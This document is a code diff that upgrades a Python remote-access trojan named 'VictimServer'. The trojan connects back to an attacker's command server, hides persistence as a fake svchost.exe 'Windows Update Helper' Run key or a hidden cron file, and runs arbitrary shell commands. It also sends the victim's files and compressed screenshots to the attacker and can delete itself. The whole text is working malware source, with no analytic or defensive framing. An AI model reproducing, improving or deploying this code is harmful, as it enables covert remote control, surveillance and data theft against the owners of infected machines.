@@ -7,165 +7,261 @@ import time
 import platform
 import shutil
 import threading
+import hashlib
 from pathlib import Path
+import zlib
 
 # Configuration
 C2_HOST = '192.168.1.100'  # Attacker C2 IP
 C2_PORT = 443
 RECONNECT_INTERVAL = 10
-MAX_FILE_CHUNK = 4096
-
+MAX_FILE_CHUNK = 4096 * 16  # Increased buffer size
+SCREENSHOT_QUALITY = 70      # For JPEG compression
 
 class VictimServer:
     def __init__(self):
         self.sock = None
         self.platform = platform.system()
         self.session_id = os.urandom(4).hex()
+        self.lock = threading.Lock()
         self.persist()
+        self.screenshot_count = 0
 
     def persist(self):
-        """Install persistence mechanism"""
+        """Improved persistence mechanism"""
         try:
             if self.platform == 'Windows':
-                key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
-                reg_entry = 'Windows Update Helper'
                 exe_path = os.path.join(os.getenv('APPDATA'), 'svchost.exe')
                 if not os.path.exists(exe_path):
-                    shutil.copyfile(sys.argv[0], exe_path)
+                    shutil.copy2(sys.argv[0], exe_path)
                     subprocess.check_call(
-                        f'reg add HKCU\\{key_path} /v {reg_entry} /t REG_SZ /d "{exe_path}"',
+                        f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
+                        f'/v "Windows Update Helper" /t REG_SZ /d "{exe_path}" /f',
                         shell=True,
-                        stderr=subprocess.DEVNULL,
-                        stdin=subprocess.DEVNULL
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL
                     )
             elif self.platform == 'Linux':
-                cron_entry = '@reboot /usr/bin/python3 ' + sys.argv[0]
                 cron_path = '/etc/cron.d/.systemd'
                 if not os.path.exists(cron_path):
                     with open(cron_path, 'w') as f:
-                        f.write(cron_entry)
+                        f.write(f'@reboot /usr/bin/python3 {sys.argv[0]}\n')
                     os.chmod(cron_path, 0o644)
-        except Exception:
+        except Exception as e:
             pass
 
     def connect_c2(self):
-        """Establish connection to C2 server"""
+        """Robust connection handler with keepalive"""
         while True:
             try:
                 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                 self.sock.connect((C2_HOST, C2_PORT))
+                self.sock.settimeout(30)
                 self.send_system_info()
                 return True
-            except Exception:
+            except Exception as e:
                 time.sleep(RECONNECT_INTERVAL)
 
     def send_system_info(self):
-        """Send victim profile to C2"""
+        """Enhanced system fingerprinting"""
         info = {
             'id': self.session_id,
             'os': self.platform,
             'hostname': platform.node(),
-            'user': os.getenv('USERNAME') or os.getenv('USER')
+            'user': os.getenv('USERNAME') or os.getenv('USER'),
+            'privilege': 'admin' if os.getuid() == 0 else 'user'
         }
-        self.sock.send(json.dumps(info).encode())
+        self._safe_send(json.dumps(info))
 
     def receive_commands(self):
-        """Main command loop"""
+        """Threaded command handler"""
         while True:
             try:
                 cmd = self.sock.recv(MAX_FILE_CHUNK).decode().strip()
                 if not cmd:
-                    raise ConnectionError()
+                    raise ConnectionError("Empty command received")
 
-                # Process commands
-                if cmd.startswith('download '):
-                    self.send_file(cmd[9:])
-                elif cmd.startswith('upload '):
-                    self.receive_file(cmd[7:])
-                elif cmd == 'screenshot':
-                    self.take_screenshot()
-                elif cmd == 'persist':
-                    self.persist()
-                elif cmd == 'kill':
-                    self.self_destruct()
-                else:
-                    output = self.execute_command(cmd)
-                    self.sock.send(output.encode())
+                # Handle commands in separate threads
+                threading.Thread(target=self.process_command, args=(cmd,)).start()
+
+            except socket.timeout:
+                self._safe_send(b'<HEARTBEAT>')
             except Exception as e:
                 self.connect_c2()
 
-    def execute_command(self, cmd):
-        """Execute system command"""
+    def process_command(self, cmd):
+        """Command router with improved error handling"""
         try:
-            result = subprocess.check_output(
+            if cmd.startswith('download '):
+                self.send_file(cmd[9:])
+            elif cmd.startswith('upload '):
+                self.receive_file(cmd[7:])
+            elif cmd == 'screenshot':
+                self.take_screenshot()
+            elif cmd == 'persist':
+                self.persist()
+            elif cmd == 'kill':
+                self.self_destruct()
+            else:
+                output = self.execute_command(cmd)
+                self._safe_send(output)
+        except Exception as e:
+            self._safe_send(f"Command failed: {str(e)}")
+
+    def execute_command(self, cmd):
+        """Secure command execution with timeout"""
+        try:
+            result = subprocess.run(
                 cmd,
                 shell=True,
-                stderr=subprocess.STDOUT,
-                timeout=60
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                timeout=30
             )
-            return result.decode(errors='ignore')
+            output = result.stdout.decode(errors='replace') or result.stderr.decode(errors='replace')
+            return output
         except Exception as e:
             return str(e)
 
     def send_file(self, file_path):
-        """Transfer file to attacker"""
+        """Reliable file transfer with checksum verification"""
         try:
+            if not os.path.exists(file_path):
+                self._safe_send(f"File not found: {file_path}")
+                return
+
+            # Send file metadata
+            file_name = os.path.basename(file_path)
+            file_size = os.path.getsize(file_path)
+            file_hash = self._calculate_file_hash(file_path)
+            metadata = json.dumps({
+                'name': file_name,
+                'size': file_size,
+                'hash': file_hash
+            })
+            self._safe_send(metadata.encode())
+
+            # Wait for ACK
+            if self.sock.recv(3) != b'ACK':
+                raise ConnectionError("No ACK received")
+
+            # Send file content
+            sent_bytes = 0
             with open(file_path, 'rb') as f:
-                while True:
+                while sent_bytes < file_size:
                     chunk = f.read(MAX_FILE_CHUNK)
-                    if not chunk:
-                        break
-                    self.sock.sendall(chunk)
-            time.sleep(0.5)
-            self.sock.send(b'<END>')
+                    compressed = zlib.compress(chunk, level=1)
+                    self._safe_send(compressed)
+                    sent_bytes += len(chunk)
+
+            # Verify transfer
+            if self.sock.recv(3) == b'VER':
+                self._safe_send(file_hash.encode())
+
         except Exception as e:
-            self.sock.send(f'File error: {str(e)}'.encode())
+            self._safe_send(f"File transfer failed: {str(e)}")
 
     def receive_file(self, file_path):
-        """Receive file from attacker"""
+        """Secure file reception with validation"""
         try:
+            metadata = json.loads(self.sock.recv(MAX_FILE_CHUNK).decode())
+            self._safe_send(b'ACK')
+
+            received = 0
+            file_hash = hashlib.sha256()
             with open(file_path, 'wb') as f:
-                while True:
-                    chunk = self.sock.recv(MAX_FILE_CHUNK)
-                    if chunk.endswith(b'<END>'):
-                        f.write(chunk[:-5])
-                        break
+                while received < metadata['size']:
+                    chunk = zlib.decompress(self.sock.recv(MAX_FILE_CHUNK))
                     f.write(chunk)
-            self.sock.send('File uploaded successfully'.encode())
+                    file_hash.update(chunk)
+                    received += len(chunk)
+
+            # Verify integrity
+            if file_hash.hexdigest() == metadata['hash']:
+                self._safe_send("File upload successful")
+            else:
+                os.remove(file_path)
+                self._safe_send("File integrity check failed")
+
         except Exception as e:
-            self.sock.send(f'Upload failed: {str(e)}'.encode())
+            self._safe_send(f"File receive failed: {str(e)}")
 
     def take_screenshot(self):
-        """Capture screen (requires pyautogui)"""
+        """Enhanced screenshot capture with compression"""
         try:
-            from pyautogui import screenshot
-            screenshot('screen.png')
-            self.send_file('screen.png')
-            os.remove('screen.png')
+            from PIL import ImageGrab, Image
+            import io
+
+            self.screenshot_count += 1
+            filename = f"screenshot_{self.screenshot_count}.jpg"
+
+            # Capture and compress
+            img = ImageGrab.grab()
+            buf = io.BytesIO()
+            img.save(buf, format='JPEG', quality=SCREENSHOT_QUALITY)
+            buf.seek(0)
+
+            # Save temp file
+            with open(filename, 'wb') as f:
+                f.write(buf.getvalue())
+
+            # Send and cleanup
+            self.send_file(filename)
+            os.remove(filename)
+
         except ImportError:
-            self.sock.send('Install pyautogui for screenshots'.encode())
+            self._safe_send("Install Pillow for screenshots: pip install pillow")
+        except Exception as e:
+            self._safe_send(f"Screenshot failed: {str(e)}")
+
+    def _safe_send(self, data):
+        """Thread-safe sending with retries"""
+        with self.lock:
+            try:
+                if isinstance(data, str):
+                    data = data.encode()
+                self.sock.sendall(len(data).to_bytes(4, 'big'))
+                self.sock.sendall(data)
+            except Exception as e:
+                self.connect_c2()
+
+    def _calculate_file_hash(self, path):
+        """Calculate SHA-256 hash of file"""
+        sha = hashlib.sha256()
+        with open(path, 'rb') as f:
+            while True:
+                chunk = f.read(MAX_FILE_CHUNK)
+                if not chunk:
+                    break
+                sha.update(chunk)
+        return sha.hexdigest()
 
     def self_destruct(self):
-        """Remove persistence and exit"""
+        """Thorough cleanup mechanism"""
         try:
             if self.platform == 'Windows':
-                subprocess.call(
-                    'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Update Helper" /f',
-                    shell=True)
+                subprocess.run(
+                    'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
+                    '/v "Windows Update Helper" /f',
+                    shell=True,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+                os.remove(os.path.join(os.getenv('APPDATA'), 'svchost.exe'))
             elif self.platform == 'Linux':
                 os.remove('/etc/cron.d/.systemd')
         finally:
             sys.exit(0)
 
     def start(self):
-        """Main execution loop"""
+        """Main execution with watchdog"""
         while True:
-            if self.connect_c2():
-                try:
+            try:
+                if self.connect_c2():
                     self.receive_commands()
-                except ConnectionResetError:
-                    self.connect_c2()
-
+            except Exception as e:
+                time.sleep(RECONNECT_INTERVAL)
 
 if __name__ == '__main__':
     VictimServer().start()
